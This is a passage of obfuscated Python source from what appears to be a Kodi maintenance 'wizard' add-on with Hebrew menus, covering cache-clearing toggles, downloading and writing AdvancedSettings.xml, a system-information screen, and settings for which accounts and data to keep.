		addFile ('--- ניקוי קאש בהפעלה: %s'%OOOOO0OO0O00O00O0 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00OOOO0OO00OOOO .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00OO0O00O00O000O .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2906
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2907
	addFile ('Include Video Cache in Clear Cache: %s'%OO0OOOOO0O00O000O .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	if OO0OOOOO0O00O000O =='true':#line:2909
		addFile ('--- Include All Video Addons: %s'%O000OO00O0OOOO000 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Bob: %s'%OOO0O0OO0O0000000 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Phoenix: %s'%OOO0OO00OOOOO0OO0 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Specto: %s'%OOO00O000000OOOOO .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Exodus: %s'%OO00000O0OOO000O0 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Salts: %s'%O00OOO0OO0OOO0OO0 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Salts HD Lite: %s'%OO0O00O0OO00OO00O .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include One Channel: %s'%O00000000OOOO0O00 .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Genesis: %s'%O0OOOO00O00O00OOO .replace ('true',O00OO00000O0OO00O ).replace ('false',O000O000OO000O000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2920
	setView ('files','viewType')#line:2921
def advancedWindow (url =None ):#line:2923
	if not ADVANCEDFILE =='http://':#line:2924
		if url ==None :#line:2925
			O0O0OOO0000OOO000 =wiz .workingURL (ADVANCEDFILE )#line:2926
			O000000O000OOOO00 =uservar .ADVANCEDFILE #line:2927
		else :#line:2928
			O0O0OOO0000OOO000 =wiz .workingURL (url )#line:2929
			O000000O000OOOO00 =url #line:2930
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if os .path .exists (ADVANCED ):#line:2932
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if O0O0OOO0000OOO000 ==True :#line:2935
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			O0O0O00OOOO00O0O0 =wiz .openURL (O000000O000OOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2937
			O0O0O0OOO0OOOO0OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0O00OOOO00O0O0 )#line:2938
			if len (O0O0O0OOO0OOOO0OO )>0 :#line:2939
				for OO000O0O000000O00 ,OO00OO00OOOO000OO ,url ,O0OOOOOO00OOOO000 ,OO0OOOO0000OOO00O ,O00OO0O00OO000O00 in O0O0O0OOO0OOOO0OO :#line:2940
					if OO00OO00OOOO000OO .lower ()=="yes":#line:2941
						addDir ("[B]%s[/B]"%OO000O0O000000O00 ,'advancedsetting',url ,description =O00OO0O00OO000O00 ,icon =O0OOOOOO00OOOO000 ,fanart =OO0OOOO0000OOO00O ,themeit =THEME3 )#line:2942
					else :#line:2943
						addFile (OO000O0O000000O00 ,'writeadvanced',OO000O0O000000O00 ,url ,description =O00OO0O00OO000O00 ,icon =O0OOOOOO00OOOO000 ,fanart =OO0OOOO0000OOO00O ,themeit =THEME2 )#line:2944
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2945
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O0OOO0000OOO000 )#line:2946
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2947
def writeAdvanced (OO0OO0O0OOOOO0O0O ,OO0O0OO0O0O00000O ):#line:2949
	O0O0O0O0O000OOO00 =wiz .workingURL (OO0O0OO0O0O00000O )#line:2950
	if O0O0O0O0O000OOO00 ==True :#line:2951
		if os .path .exists (ADVANCED ):O00OOO000O0OO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OO0O0OOOOO0O0O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2952
		else :O00OOO000O0OO00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO0OO0O0OOOOO0O0O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2953
		if O00OOO000O0OO00O0 ==1 :#line:2955
			OO00O00OOOO0O0O00 =wiz .openURL (OO0O0OO0O0O00000O )#line:2956
			O0O0OO0OOO0O0O0OO =open (ADVANCED ,'w');#line:2957
			O0O0OO0OOO0O0O0OO .write (OO00O00OOOO0O0O00 )#line:2958
			O0O0OO0OOO0O0O0OO .close ()#line:2959
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2960
			wiz .killxbmc (True )#line:2961
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2962
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O0O0O0O000OOO00 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2963
def viewAdvanced ():#line:2965
	O0O00O000O00000O0 =open (ADVANCED )#line:2966
	OO000OOO00OO000O0 =O0O00O000O00000O0 .read ().replace ('\t','    ')#line:2967
	wiz .TextBox (ADDONTITLE ,OO000OOO00OO000O0 )#line:2968
	O0O00O000O00000O0 .close ()#line:2969
def removeAdvanced ():#line:2971
	if os .path .exists (ADVANCED ):#line:2972
		wiz .removeFile (ADVANCED )#line:2973
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2974
def showAutoAdvanced ():#line:2976
	notify .autoConfig ()#line:2977
def getIP ():#line:2979
	OO0OOO00OO0O0000O ='http://whatismyipaddress.com/'#line:2980
	if not wiz .workingURL (OO0OOO00OO0O0000O ):return 'Unknown','Unknown','Unknown'#line:2981
	O0O00OO0000OO0O00 =wiz .openURL (OO0OOO00OO0O0000O ).replace ('\n','').replace ('\r','')#line:2982
	if not 'Access Denied'in O0O00OO0000OO0O00 :#line:2983
		OO0OO0O0OO0OO000O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0O00OO0000OO0O00 )#line:2984
		OO00O00O0OOO00000 =OO0OO0O0OO0OO000O [0 ]if (len (OO0OO0O0OO0OO000O )>0 )else 'Unknown'#line:2985
		OOOOOO00O00OOO000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0O00OO0000OO0O00 )#line:2986
		OOOOOO00O00OO000O =OOOOOO00O00OOO000 [0 ]if (len (OOOOOO00O00OOO000 )>0 )else 'Unknown'#line:2987
		OO00O0OO0O000O000 =OOOOOO00O00OOO000 [1 ]+', '+OOOOOO00O00OOO000 [2 ]+', '+OOOOOO00O00OOO000 [3 ]if (len (OOOOOO00O00OOO000 )>2 )else 'Unknown'#line:2988
		return OO00O00O0OOO00000 ,OOOOOO00O00OO000O ,OO00O0OO0O000O000 #line:2989
	else :return 'Unknown','Unknown','Unknown'#line:2990
def systemInfo ():#line:2992
	O00OOO00OO0OO0O0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3006
	O0OO000O00OO000OO =[];OOOO00OO000000OO0 =0 #line:3007
	for O0OO0O0O0OO00OO0O in O00OOO00OO0OO0O0O :#line:3008
		O0O00000000O0OOOO =wiz .getInfo (O0OO0O0O0OO00OO0O )#line:3009
		OO00O00OOO000O0OO =0 #line:3010
		while O0O00000000O0OOOO =="Busy"and OO00O00OOO000O0OO <10 :#line:3011
			O0O00000000O0OOOO =wiz .getInfo (O0OO0O0O0OO00OO0O );OO00O00OOO000O0OO +=1 ;wiz .log ("%s sleep %s"%(O0OO0O0O0OO00OO0O ,str (OO00O00OOO000O0OO )));xbmc .sleep (1000 )#line:3012
		O0OO000O00OO000OO .append (O0O00000000O0OOOO )#line:3013
		OOOO00OO000000OO0 +=1 #line:3014
	O0OOOOOO0OOO000O0 =O0OO000O00OO000OO [8 ]if 'Una'in O0OO000O00OO000OO [8 ]else wiz .convertSize (int (float (O0OO000O00OO000OO [8 ][:-8 ]))*1024 *1024 )#line:3015
	OOO00OOOO000OOOO0 =O0OO000O00OO000OO [9 ]if 'Una'in O0OO000O00OO000OO [9 ]else wiz .convertSize (int (float (O0OO000O00OO000OO [9 ][:-8 ]))*1024 *1024 )#line:3016
	O00O0OOOO00OOOO00 =O0OO000O00OO000OO [10 ]if 'Una'in O0OO000O00OO000OO [10 ]else wiz .convertSize (int (float (O0OO000O00OO000OO [10 ][:-8 ]))*1024 *1024 )#line:3017
	OO0OOOOO0OOO0O0OO =wiz .convertSize (int (float (O0OO000O00OO000OO [11 ][:-2 ]))*1024 *1024 )#line:3018
	O0O0OO000O0O0OO0O =wiz .convertSize (int (float (O0OO000O00OO000OO [12 ][:-2 ]))*1024 *1024 )#line:3019
	OOOO00O0000O0OO0O =wiz .convertSize (int (float (O0OO000O00OO000OO [13 ][:-2 ]))*1024 *1024 )#line:3020
	O00OO0000O000O0OO ,O0O0000O0OOOOO00O ,O0OO00000O0OO0O00 =getIP ()#line:3021
	O000000O00000000O =[];O00OOOO000O0O0O00 =[];OO0OO0O0O0OO000OO =[];O00O00O0O0OOOO00O =[];OOO0OO0OOOO0O0O0O =[];OOOOOOOO000OOO000 =[];OOO000OO00OOO0000 =[]#line:3023
	O000OOO0OO00O0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3025
	for OO0000OOO00O0000O in sorted (O000OOO0OO00O0OO0 ,key =lambda OO0OO00O0O0OOOO00 :OO0OO00O0O0OOOO00 ):#line:3026
		OOO0O0O0O0OOO000O =os .path .split (OO0000OOO00O0000O [:-1 ])[1 ]#line:3027
		if OOO0O0O0O0OOO000O =='packages':continue #line:3028
		OOOOO000OO000O00O =os .path .join (OO0000OOO00O0000O ,'addon.xml')#line:3029
		if os .path .exists (OOOOO000OO000O00O ):#line:3030
			O000OOO0O00O00O00 =open (OOOOO000OO000O00O )#line:3031
			OOO0OO00OOOO0O00O =O000OOO0O00O00O00 .read ()#line:3032
			O00OOO0O0O0O00OO0 =re .compile ("<provides>(.+?)</provides>").findall (OOO0OO00OOOO0O00O )#line:3033
			if len (O00OOO0O0O0O00OO0 )==0 :#line:3034
				if OOO0O0O0O0OOO000O .startswith ('skin'):OOO000OO00OOO0000 .append (OOO0O0O0O0OOO000O )#line:3035
				if OOO0O0O0O0OOO000O .startswith ('repo'):OOO0OO0OOOO0O0O0O .append (OOO0O0O0O0OOO000O )#line:3036
				else :OOOOOOOO000OOO000 .append (OOO0O0O0O0OOO000O )#line:3037
			elif not (O00OOO0O0O0O00OO0 [0 ]).find ('executable')==-1 :O00O00O0O0OOOO00O .append (OOO0O0O0O0OOO000O )#line:3038
			elif not (O00OOO0O0O0O00OO0 [0 ]).find ('video')==-1 :OO0OO0O0O0OO000OO .append (OOO0O0O0O0OOO000O )#line:3039
			elif not (O00OOO0O0O0O00OO0 [0 ]).find ('audio')==-1 :O00OOOO000O0O0O00 .append (OOO0O0O0O0OOO000O )#line:3040
			elif not (O00OOO0O0O0O00OO0 [0 ]).find ('image')==-1 :O000000O00000000O .append (OOO0O0O0O0OOO000O )#line:3041
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3046
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOOO0OOO000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOOO000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0OOOO00OOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOOO0OOO0O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OO000O0O0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO00O0000O0OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OO0000O000O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O0OOOOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00000O0OO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OO000OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	OO000O00O000OOOOO =len (O000000O00000000O )+len (O00OOOO000O0O0O00 )+len (OO0OO0O0O0OO000OO )+len (O00O00O0O0OOOO00O )+len (OOOOOOOO000OOO000 )+len (OOO000OO00OOO0000 )+len (OOO0OO0OOOO0O0O0O )#line:3071
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO000O00O000OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO0O0O0OO000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O00O0O0OOOO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOOO000O0O0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000000O00000000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO0OOOO0O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000OO00OOO0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOOO000OOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
def Menu ():#line:3080
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3081
def saveMenu ():#line:3083
	O0OO0OOOO0000O0OO ='[COLOR yellow]מופעל[/COLOR]';OOO0OO0000000O00O ='[COLOR blue]מבוטל[/COLOR]'#line:3085
	O00OOO0OO0O000OOO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3086
	OO0000O00OOO00000 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3087
	O00O000OO0000O0O0 ='true'if KEEPINFO =='true'else 'false'#line:3088
	OO0O0OO0O00O00000 ='true'if KEEPSOUND =='true'else 'false'#line:3090
	OOO0OOOO000O000O0 ='true'if KEEPVIEW =='true'else 'false'#line:3091
	OOOOOOOOO00000O0O ='true'if KEEPSKIN =='true'else 'false'#line:3092
	O0OOOO0O000OO00O0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3093
	O0OOO0O00OO000OO0 ='true'if KEEPSKIN3 =='true'else 'false'#line:3094
	O0O0OO000OO00O00O ='true'if KEEPADDONS =='true'else 'false'#line:3095
	O0O00O0O000000OOO ='true'if KEEPPVR =='true'else 'false'#line:3096
	O0O00O0OOOO0O00OO ='true'if KEEPTVLIST =='true'else 'false'#line:3097
	OOO0O0OO0O0OO0O0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3098
	OO0O0OOO00OOO0OOO ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3099
	O0OO000OO0O0000OO ='true'if KEEPHUBTV =='true'else 'false'#line:3100
	OOO0OOOO0OOO00OOO ='true'if KEEPHUBVOD =='true'else 'false'#line:3101
	O0OOO00OO0O00O0OO ='true'if KEEPHUBSPORT =='true'else 'false'#line:3102
	O00O0O0OO00O0O0O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3103
	O0OOOOO0OOO0OO000 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3104
	OO0OOOO00000OOOO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3105
	O0OO0O0000O0O00OO ='true'if KEEPPLAYLIST =='true'else 'false'#line:3106
	O00O0O0OOO0OO0O00 ='true'if KEEPTRAKT =='true'else 'false'#line:3107
	O0O00OO000O000O00 ='true'if KEEPREAL =='true'else 'false'#line:3108
	OOO0O0OO00O00OOO0 ='true'if KEEPRD2 =='true'else 'false'#line:3109
	OOOO0O0O0000O00OO ='true'if KEEPTORNET =='true'else 'true'#line:3110
	O00O0O0OOO0O0000O ='true'if KEEPLOGIN =='true'else 'false'#line:3111
	O00O0O00OO0OO0O0O ='true'if KEEPSOURCES =='true'else 'false'#line:3112
	OO00OO000000O0O00 ='true'if KEEPADVANCED =='true'else 'false'#line:3113
	O0000OOO00O000O0O ='true'if KEEPPROFILES =='true'else 'false'#line:3114
	O00O0000000OO0000 ='true'if KEEPFAVS =='true'else 'false'#line:3115
	O0O0O0O000OO000OO ='true'if KEEPREPOS =='true'else 'false'#line:3116
	O0OO0OO0OOOO0OO0O ='true'if KEEPSUPER =='true'else 'false'#line:3117
	OO00O000000O0O0O0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3118
	O00OOOOO0O0OOO0O0 ='true'if KEEPWEATHER =='true'else 'false'#line:3119
	OO0OOOOO0OOOO00O0 ='true'if KEEPVICTORY =='true'else 'false'#line:3120
	O000O00O0OOOO00O0 ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3121
	if OO00O000000O0O0O0 =='true':#line:3123
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3125
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3126
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון RD:  '%O0O00OO000O000O00 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון טראקט:  '%O00O0O0OOO0OO0O00 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מועדפים:  '%O00O0000000OO0000 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0O00O0O000000OOO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OO0OOOOO0OOOO00O0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טלמדיה:  '%O000O00O0OOOO00O0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0O00O0OOOO0O00OO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח סרטים:  '%OOO0O0OO0O0OO0O0O .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח סדרות:  '%OO0O0OOO00OOO0OOO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח טלויזיה:  '%O0OO000OO0O0000OO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OOO0OOOO0OOO00OOO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח ספורט:  '%O0OOO00OO0O00O0OO .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח ילדים:  '%O00O0O0OO00O0O0O0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח מוסיקה:  '%O0OOOOO0OOO0OO000 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO0OOOO00000OOOO0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOOOOOOO00000O0O .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O00OOOOO0O0OOO0O0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0O0OO000OO00O00O .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O00O000OO0000O0O0 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO0000O00OOO00000 .replace ('true',O0OO0OOOO0000O0OO ).replace ('false',OOO0OO0000000O00O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
